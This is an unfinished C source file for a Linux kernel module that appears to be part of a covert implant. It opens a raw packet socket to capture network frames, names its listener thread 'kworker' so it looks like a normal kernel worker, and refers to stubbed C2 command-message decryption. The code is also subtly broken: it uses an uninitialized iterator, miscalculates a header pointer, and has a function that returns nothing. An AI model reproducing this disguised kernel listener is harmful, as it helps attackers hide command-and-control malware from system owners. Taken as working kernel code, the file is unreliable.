/*
 * Author: Daniel Liscinsky
 */



#include <linux/kthread.h>
#include <linux/sched.h>
#include <linux/delay.h>
#include <linux/errno.h>
#include <linux/types.h>
//#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/types.h>

#include <linux/mutex.h>

#include <linux/socket.h>
//#include <net/sock.h>
//#include <net/inet_common.h>
#include <linux/net.h>
#include <linux/ip.h>
#include <linux/in.h>
#include <linux/if_ether.h>

#include "rte_ether.h"
#include "rte_ip.h"
#include "debug.h"



#define MAX_ETH_PKT_SIZE 1522



static int is_rtr_running = 0;
static struct task_struct *kthread;
static struct mutex rtr_thread_mutex;
static struct socket *rtr_socket;


/**
 * 
 */
/*int decrypt_verify_c2_msg(...) {

	return 0;
}

/**
 * Close the socket used for forwarding traffic.
 * rtr_socket is now NULL.
 */
int close_rtr_socket() {

	if (rtr_socket) {
		sock_release(rtr_socket);
		rtr_socket = NULL;
	}
	
	return 0;
}

int ksocket_receive(struct socket* sock, unsigned char* buf, int buf_len) {
	
	struct msghdr msg;
	struct iov_iter iovec_iter;
	struct kvec vec;
	mm_segment_t oldfs;
	int size = 0;
	/*
	if (sock->sk == NULL) return -2;

	iov.iov_base = buf;
	iov.iov_len = len;

	msg.msg_flags = 0;
	msg.msg_name = addr;
	msg.msg_namelen  = sizeof(struct sockaddr_in);
	msg.msg_control = NULL;
	msg.msg_controllen = 0;
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
	msg.msg_control = NULL;

	oldfs = get_fs();
	set_fs(KERNEL_DS);
	size = sock_recvmsg(sock, &msg, msg.msg_flags);
	set_fs(oldfs);

	return size;
	*/
	
	

	vec.iov_base = buf;
	vec.iov_len = buf_len;

	//iovec_iter = ;

	msg.msg_name    = 0;
	msg.msg_namelen = 0;
	msg.msg_iter = iovec_iter;
	msg.msg_control = NULL;
	msg.msg_controllen = 0;
	msg.msg_flags = 0; // this is set after receiving a message
	

	oldfs = get_fs(); 
	set_fs(KERNEL_DS);
	// MSG_DONTWAIT: nonblocking operation: as soon as the packet is read, the call returns
	// MSG_WAITALL: blocks until it does not receive size_buff bytes OR the SO_RCVTIMEO expires.
	size =  kernel_recvmsg(sock, &msg, &vec, 1, buf_len, MSG_WAITALL);
	set_fs(oldfs);

	return size;
}

int recv_msg (struct socket *sock, char *buf, unsigned int len) {

	int size;
	struct msghdr msg;
	struct iov_iter iovec_iter;
	struct iovec iov;
	mm_segment_t old_fs;

	// Ensure valid socket
	if (!sock) {
		return -1;
	}
	if (!sock->sk) {
		return 0;
	}
	
	// Initialize message struct
	{
		iov.iov_base = buf;
		iov.iov_len = len;

		iovec_iter.type = ITER_IOVEC;
		iovec_iter.iov_offset = 0;
		iovec_iter.count = 1;
		iovec_iter.iov = &iov;
		iovec_iter.nr_segs = 0;

		msg.msg_name = 0;
		msg.msg_namelen = 0;
		msg.msg_iter = iovec_iter;
		//msg.msg_iov = &iov;
		//msg.msg_iovlen = 1;
		msg.msg_control = NULL;
		msg.msg_controllen = 0;
		msg.msg_flags = 0;
	}
	
	// Receive message
	old_fs = get_fs();
	set_fs(get_ds());
	//set_fs(KERNEL_DS);
	size = sock_recvmsg(sock, &msg, msg.msg_flags);
	set_fs(old_fs);

	return size;
}

int recv_frame() {


	//orig_socket = (__socket_t) __sys_call_table[__NR_socket];

	typedef asmlinkage ssize_t (*__recv_t)(int sockfd, void *buf, size_t len, int flags);
	//orig_recv = (__recv_t) __sys_call_table[__NR_recv];




	uint8_t frame[MAX_ETH_PKT_SIZE];


	//ssize_t len = orig_recv(rtr_socket, frame, sizeof(frame), MSG_TRUNC | MSG_ERRQUEUE);



	
}

/**
 * 
 */
int rtr_listen(void *data) {

	const int noblock = 0;
	int flags = 0;
	struct user_msghdr msg;
	struct iovec iov;
	int addr_len;

	uint8_t buf[MAX_ETH_PKT_SIZE];
	unsigned int buf_len = MAX_ETH_PKT_SIZE;
	int bytes_read, bytes_written;

	int i;

	//iov.iov_base = buf;
	//iov.iov_len = len;

	

	//struct file *filep;
	unsigned int size, crc32_target, crc32_calc = 0;
	struct sockaddr_in saddr;
	mm_segment_t old_fs;
	/*
	buf = kmalloc(4096, GFP_KERNEL);
	if ( ! buf )
	{
		DEBUG("Error allocating memory for download\n");

		filp_close(filep, NULL);
		return 1;
	}
	*/


	/*
	memset(&saddr, 0, sizeof(saddr));
	saddr.sin_family = AF_INET;
	saddr.sin_port = port;
	saddr.sin_addr.s_addr = ip;

	inet_stream_connect(sock, (struct sockaddr *)&saddr, sizeof(saddr), 0);
	*/


	while (!kthread_should_stop()) {

		DEBUG_pr_info("[INFO] rtr listen kthread is listening...\n");
		//ssleep(1);

		/*
		msg.msg_control = NULL;
		msg.msg_controllen = 0;
		msg.msg_flags = 0;
		msg.msg_name = 0;
		msg.msg_namelen = 0;
		msg.msg_iov = &iov;
		msg.msg_iovlen = 1;
		*/

		// Block until a message arrives
		struct sockaddr_in addr;
		//int size = ksocket_receive(rtr_socket, &addr, buf, len);
		//int size = udp_recvmsg(c2_socket.sk, &msg, size_t len, noblock, flags, &addr_len);
		//int size = sock_recvmsg(c2_socket.sk, &msg, msg.msg_flags);

		bytes_read = recv_msg(rtr_socket, buf, buf_len);

		// If timed out blocking (or otherwise received 0)
		//if (!size) {
		if (bytes_read <= 0) {
			/*
			 * It is important that the blocking recv eventually time out
			 * so that this thread can reguarly check if kthread_should_stop()
			 * is set. Otherwise this thread will never terminate and the
			 * kernel module cannot be unloaded.
			 */
			continue;
		}

		// Try to decrypt message
		//TODO

		DEBUG_printk2("[INFO] recv size = %d\n", bytes_read);
		/*
		DEBUG_pr_info("[INFO] Message:\n");
		for (i = 0; i < len; i++) {
			DEBUG_printk2("%hhx ", buf[i]);
		}
		*/

		struct ether_hdr *eth_hdr = (struct ether_hdr *)buf;
		unsigned int l3_hdr_offset = sizeof(struct ether_hdr);


		unsigned short eth_proto = ntohs(eth_hdr->ether_type);

		char mac_addr_str[18];
		ether_format_addr(mac_addr_str, sizeof(mac_addr_str), &eth_hdr->d_addr);
		DEBUG_printk2("dst MAC: %s\n", mac_addr_str);
		ether_format_addr(mac_addr_str, sizeof(mac_addr_str), &eth_hdr->s_addr);
		DEBUG_printk2("src MAC: %s\n", mac_addr_str);
		DEBUG_printk2("Ether proto: %02hx\n", eth_proto);


		if (eth_proto == ETHER_TYPE_VLAN) {
			
			//struct vlan ...
			//eth_proto = 
			//l3_hdr_offset += 
		}


		if (eth_proto == ETHER_TYPE_IPv4) {

			struct ipv4_hdr *ipv4_hdr = (struct ipv4_hdr *) eth_hdr + l3_hdr_offset;


		}
		else if (eth_proto == ETHER_TYPE_IPv6) {

			//TODO Not implemented
		}
		// Some other packet type
		else {
			// Do nothing, we don't care about it
		}

		DEBUG_printk1("\n");
		DEBUG_pr_info("\n---END---\n");
	}
	
	DEBUG_pr_info("[INFO] rtr listen kthread is stopped\n");
	return 0;
}



int start_routing() {

	int error;
	mm_segment_t fs;
	struct sockaddr_in sin;
	int flag = 1;
	struct timeval recv_timeout = {0, 100000};


	// Check if routing process is already running
	if (is_rtr_running) {
		return 0;
	}
	
	// Initialize the mutex
	mutex_init(&rtr_thread_mutex);

	
	/*
	DECLARE_WAIT_QUEUE_HEAD(wq);

	mutex_lock(&c2_thread_mutex);
	{
		current->flags |= PF_NOFREEZE;
		//daemonize(MODULE_NAME);
		allow_signal(SIGKILL | SIGSTOP);
	}
	mutex_unlock(&c2_thread_mutex);
	*/
	
	error = sock_create(AF_PACKET, SOCK_RAW, htons(ETH_P_IP), &rtr_socket);

	if(error < 0) {
		DEBUG_pr_info("[ERROR] Failed to create rtr socket\n");
		return -1;				// TODO more error handling
	}
	

	fs = get_fs();
	set_fs(KERNEL_DS);
	kernel_setsockopt(rtr_socket, SOL_SOCKET, SO_RCVTIMEO , (char * )&recv_timeout, sizeof(recv_timeout));
	kernel_setsockopt(rtr_socket, SOL_SOCKET, SO_REUSEADDR , (char * )&flag, sizeof(int));
	kernel_setsockopt(rtr_socket, SOL_SOCKET, SO_REUSEPORT , (char * )&flag, sizeof(int));
	set_fs(fs);

	/*
	sin.sin_addr.s_addr = htonl(INADDR_ANY);
	sin.sin_family = AF_INET;
	sin.sin_port = htons(C2_PORT);
	
	error = c2_socket->ops->bind(c2_socket, (struct sockaddr*)&sin, sizeof(sin));
	if(error < 0) {
		DEBUG_pr_info("[ERROR] BIND ADDRESS\n");
		return -1;				// TODO more error handling
	}
	*/
	/*
	error = c2_socket->ops->listen(c2_socket, 5);
	if(error < 0) {
		DEBUG_pr_info("[ERROR] LISTEN ERROR\n");
		return -1;				// TODO more error handling
	}
	*/


	DEBUG_pr_info("[INFO] Starting rtr listen kthread...\n");

	// Start thread to listen for incoming commands
	kthread = kthread_run(rtr_listen, NULL, "kworker");

	// If thread failed to start
	if (IS_ERR(kthread)) {
		
		// Try again
		kthread = kthread_run(rtr_listen, NULL, "kworker");
		if (IS_ERR(kthread)) {
			
			// Try a 3rd time
			kthread = kthread_run(rtr_listen, NULL, "kworker");
			if (IS_ERR(kthread)) {

				// Close socket before leaving
				if (close_rtr_socket() < 0) {
					// Try again to close socket
					if (close_rtr_socket() < 0) {
						return -2; // Failure, something really bad is going on
					}
				}

				DEBUG_pr_info("[ERROR] Failed to create c2 listen kthread\n");
				return -1; // Failure, this is bad
			}
		}
	}


	is_rtr_running = 1;
	return 0;
}

int stop_routing() {

	// Do nothing if routing process is not running
	if (!is_rtr_running) {
		return 0;
	}

	DEBUG_pr_info("[INFO] Stopping rtr kthread...\n");
	int ret = kthread_stop(kthread);

	// If error stopping thread
	if (ret == -EINTR) {
		DEBUG_pr_info("[ERROR] -EINTR stopping rtr kthread\n");

		//TODO This is bad
	}


	is_rtr_running = 0;
	return 0;
}


